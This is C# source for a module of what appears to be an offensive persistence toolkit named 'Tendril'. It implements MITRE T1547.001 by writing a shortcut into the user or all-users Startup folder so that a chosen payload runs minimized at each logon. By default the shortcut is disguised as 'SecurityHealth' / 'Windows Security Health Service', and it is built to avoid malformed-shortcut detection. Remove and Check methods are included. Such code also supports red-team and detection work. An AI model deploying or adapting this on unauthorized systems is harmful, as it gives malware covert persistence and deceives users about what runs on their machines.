using System;
using System.Collections.Generic;
using System.IO;
using Tendril.Core;
using Tendril.Utilities;

namespace Tendril.Modules
{
    /// <summary>
    /// Startup Folder LNK Persistence (T1547.001)
    ///
    /// Drops a .lnk shortcut into the user (or common) Startup folder. The shortcut
    /// points to the payload and executes on logon. Uses WScript.Shell COM to create
    /// a well-formed .lnk - avoids malformed shortcut detection.
    ///
    /// HKCU Startup = no admin. Common Startup = admin.
    /// </summary>
    public class StartupFolder : ITendril
    {
        public string Name { get { return "StartupFolder"; } }
        public string Description { get { return "Startup folder LNK shortcut - executes on user logon"; } }
        public string MitreId { get { return "T1547.001"; } }
        public bool RequiresAdmin { get { return false; } }
        public bool IsReconOnly { get { return false; } }

        public TendrilResult Install(Dictionary<string, string> options)
        {
            string payload, lnkName, arguments, iconPath, description;
            bool allUsers;

            if (!options.TryGetValue("payload", out payload))
                return new TendrilResult(ResultStatus.Failed, Name,
                    "Missing required option: /payload:<target_path>");

            if (!options.TryGetValue("name", out lnkName))
                lnkName = "SecurityHealth";

            if (!options.TryGetValue("arguments", out arguments))
                arguments = "";

            if (!options.TryGetValue("icon", out iconPath))
                iconPath = "";

            if (!options.TryGetValue("description", out description))
                description = "Windows Security Health Service";

            string allUsersOpt;
            allUsers = options.TryGetValue("allusers", out allUsersOpt) &&
                       allUsersOpt.ToLower() == "true";

            string startupDir = allUsers
                ? FileUtils.GetCommonStartupFolder()
                : FileUtils.GetUserStartupFolder();

            if (string.IsNullOrEmpty(startupDir) || !Directory.Exists(startupDir))
                return new TendrilResult(ResultStatus.Failed, Name,
                    "Startup folder not found: " + (startupDir ?? "null"));

            string lnkPath = Path.Combine(startupDir, lnkName + ".lnk");

            try
            {
                // Create .lnk via WScript.Shell COM
                Type wshType = Type.GetTypeFromProgID("WScript.Shell");
                dynamic wshShell = Activator.CreateInstance(wshType);
                dynamic shortcut = wshShell.CreateShortcut(lnkPath);

                shortcut.TargetPath = payload;
                if (!string.IsNullOrEmpty(arguments))
                    shortcut.Arguments = arguments;
                if (!string.IsNullOrEmpty(iconPath))
                    shortcut.IconLocation = iconPath;
                if (!string.IsNullOrEmpty(description))
                    shortcut.Description = description;
                shortcut.WindowStyle = 7; // minimized
                shortcut.Save();

                return new TendrilResult(ResultStatus.Success, Name,
                    string.Format("LNK created: {0}", lnkPath))
                    .WithMeta("LnkPath", lnkPath)
                    .WithMeta("TargetPath", payload)
                    .WithMeta("AllUsers", allUsers.ToString());
            }
            catch (Exception ex)
            {
                return new TendrilResult(ResultStatus.Failed, Name,
                    "LNK creation failed: " + ex.Message);
            }
        }

        public TendrilResult Remove(Dictionary<string, string> options)
        {
            string lnkName;
            bool allUsers;

            if (!options.TryGetValue("name", out lnkName))
                lnkName = "SecurityHealth";

            string allUsersOpt;
            allUsers = options.TryGetValue("allusers", out allUsersOpt) &&
                       allUsersOpt.ToLower() == "true";

            string startupDir = allUsers
                ? FileUtils.GetCommonStartupFolder()
                : FileUtils.GetUserStartupFolder();

            string lnkPath = Path.Combine(startupDir, lnkName + ".lnk");

            try
            {
                if (File.Exists(lnkPath))
                {
                    File.Delete(lnkPath);
                    return new TendrilResult(ResultStatus.Success, Name,
                        string.Format("LNK removed: {0}", lnkPath));
                }
                return new TendrilResult(ResultStatus.Warning, Name,
                    string.Format("LNK not found: {0}", lnkPath));
            }
            catch (Exception ex)
            {
                return new TendrilResult(ResultStatus.Failed, Name,
                    "LNK removal failed: " + ex.Message);
            }
        }

        public List<TendrilResult> Check()
        {
            var results = new List<TendrilResult>();
            string[] folders = {
                FileUtils.GetUserStartupFolder(),
                FileUtils.GetCommonStartupFolder()
            };

            foreach (string folder in folders)
            {
                if (string.IsNullOrEmpty(folder) || !Directory.Exists(folder))
                    continue;

                foreach (string file in Directory.GetFiles(folder))
                {
                    string ext = Path.GetExtension(file).ToLower();
                    if (ext == ".lnk" || ext == ".exe" || ext == ".bat" || ext == ".vbs" || ext == ".ps1" || ext == ".cmd")
                    {
                        string target = "";
                        if (ext == ".lnk")
                        {
                            try
                            {
                                Type wshType = Type.GetTypeFromProgID("WScript.Shell");
                                dynamic wsh = Activator.CreateInstance(wshType);
                                dynamic sc = wsh.CreateShortcut(file);
                                target = sc.TargetPath;
                            }
                            catch { target = "<could not resolve>"; }
                        }

                        results.Add(new TendrilResult(ResultStatus.Info, Name,
                            string.Format("Startup item: {0}", Path.GetFileName(file)))
                            .WithMeta("Path", file)
                            .WithMeta("Target", target)
                            .WithMeta("Folder", folder));
                    }
                }
            }
            return results;
        }
    }
}
